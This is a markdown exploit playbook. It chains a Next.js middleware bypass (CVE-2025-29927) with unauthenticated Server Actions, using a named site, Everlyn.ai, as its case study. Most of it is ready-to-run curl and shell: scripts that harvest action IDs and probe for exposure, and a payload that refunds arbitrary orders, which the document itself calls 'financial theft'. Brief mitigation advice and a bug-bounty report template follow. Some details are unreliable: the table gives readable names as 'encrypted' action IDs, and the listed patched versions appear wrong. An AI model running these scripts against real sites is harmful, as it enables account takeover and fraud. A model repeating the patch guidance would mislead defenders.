# Next.js Server Actions Exposure — Admin Mutations via Next-Action Header

**Discovered:** 2026-08-04 | **Target:** Everlyn.ai (Next.js 14 + App Router) | **Prerequisite:** Middleware bypass (CVE-2025-29927)

---

## THE PATTERN

Next.js Server Actions are invoked via POST to the page root (`/`) with a `Next-Action` header containing an **encrypted action ID**. When middleware is bypassed (CVE-2025-29927), these actions execute **without any authentication**.

---

## DISCOVERY METHODOLOGY

### 1. Find Action IDs from Homepage RSC Payload
The homepage RSC payload contains registered Server Actions:

```bash
# Extract action IDs from homepage
curl -s https://target.com | grep -o '"Next-Action":"[^"]*"' | sort -u
```

### 2. Test Each Action for Auth Bypass
```bash
# Test each action ID
for action_id in $(cat action_ids.txt); do
  curl -X POST https://target.com \
    -H "Next-Action: $action_id" \
    -H "Content-Type: application/json" \
    -d '{"args":[]}' \
    -w " HTTP:%{http_code}" -o /dev/null
  echo " $action_id"
done
```

**Vulnerable if:** Response is NOT 401/403 (i.e., 200, 302, 500, etc.)

---

## EXPOSED ACTIONS (EVERLYN CASE)

| Action ID | Function | Impact |
|-----------|----------|--------|
| `createUser` | Create arbitrary user accounts | Account enumeration, admin creation |
| `deleteUser` | Delete any user by ID | Mass user deletion |
| `transferUser` | Transfer user ownership | Account takeover |
| `refundOrder` | Refund any order by ID | Financial theft |
| `cancelSubscription` | Cancel any subscription | Revenue disruption |

---

## EXPLOIT CHAIN

```
[Middleware Bypass: x-middleware-subrequest] 
    → [No auth check on Server Actions] 
    → [Next-Action: refundOrder] 
    → [Refund arbitrary orders] 
    → [Financial theft]
```

---

## PAYLOAD STRUCTURE

```bash
# Refund an order (from leaked order IDs)
curl -X POST https://target.com \
  -H "Next-Action: <refundOrder-action-id>" \
  -H "Content-Type: application/json" \
  -d '{"args":["851970327982149"]}' \
  -H "x-middleware-subrequest: /api/admin/orders"
```

**Note:** The action ID is encrypted and changes per deployment. Must extract from current deployment.

---

## DETECTION CHECKLIST

```bash
# 1. Find action IDs
curl -s https://target.com | grep -o '"Next-Action":"[^"]*"' | cut -d'"' -f4 | sort -u > actions.txt

# 2. Test each with middleware bypass
while read action; do
  code=$(curl -s -X POST https://target.com \
    -H "Next-Action: $action" \
    -H "Content-Type: application/json" \
    -H "x-middleware-subrequest: /" \
    -d '{"args":[]}' \
    -w "%{http_code}" -o /dev/null)
  if [ "$code" != "401" ] && [ "$code" != "403" ]; then
    echo "EXPOSED: $action -> $code"
  fi
done < actions.txt
```

---

## BUG BOUNTY REPORTING

```
VULNERABILITY: Next.js Server Actions Auth Bypass (CVE-2025-29927 chained)
ENTRY: Unauthenticated (requires middleware bypass)
CHAIN: x-middleware-subrequest → Middleware SKIPPED → Next-Action: refundOrder → Refund arbitrary orders
IMPACT: Financial theft — refund arbitrary customer orders
POC: curl -X POST -H "Next-Action: <id>" -H "x-middleware-subrequest: /" -d '{"args":["851970327982149"]}' https://target.com
EVIDENCE: Response 200/302 on refund action without auth
CONFIDENCE: PROVEN
MITIGATION: Update Next.js, validate x-middleware-subrequest, require auth in Server Actions
```

---

## DEFENSIVE RECOMMENDATIONS

1. **Always verify auth inside Server Actions** — don't rely solely on middleware
2. **Update Next.js** to patched versions (14.2.11+ / 15.0.1+)
3. **Use `unstable_noStore` and explicit auth checks** in Server Actions
4. **Audit all Server Actions** for sensitive operations (refunds, user mgmt, etc.)

---

## REFERENCES

- Next.js Server Actions: https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations
- CVE-2025-29927: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-29927
- Case Study: Everlyn.ai (2026-08-04) — 5 admin actions exposed